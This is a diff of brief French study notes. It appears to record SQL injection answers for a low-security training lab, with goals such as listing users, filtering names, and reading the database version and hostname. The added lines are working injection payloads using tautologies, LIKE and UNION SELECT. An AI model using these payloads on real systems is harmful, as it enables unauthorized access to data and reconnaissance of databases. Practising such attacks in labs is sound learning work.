@@ -1,9 +1,16 @@
 /*LOW*/
 //la liste des utilisateurs du système
-' OR '1'='1
+' OR '1' = '1
 
 //trouver tous les utilisateurs dont le nom contient la lettre “A”
 
+x' OR last_name LIKE '%a%
+
 //la version de la base de données utilisée
 
+x' OR '1' = '1' UNION SELECT @@VERSION as last_name, NULL as first_name; #
+
+
 //l’hôte sur lequel la base de données est hébergée
+
+x' OR '1' = '1' UNION SELECT @@hostname as last_name, NULL as first_name; #
